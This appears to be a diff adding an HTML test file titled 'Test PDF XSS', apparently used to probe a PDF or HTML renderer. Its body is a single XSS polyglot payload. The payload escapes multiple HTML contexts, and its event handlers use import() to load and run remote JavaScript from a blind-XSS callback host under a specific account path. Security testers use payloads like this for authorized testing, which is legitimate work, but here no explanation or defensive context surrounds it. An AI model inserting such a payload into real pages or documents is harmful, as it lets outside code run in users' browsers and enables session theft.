@@ -1,0 +1,6 @@
+<html>
+  <body>
+    <h1>Test PDF XSS</h1>
+    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\thementer/.source))//>
+  </body>
+</html>
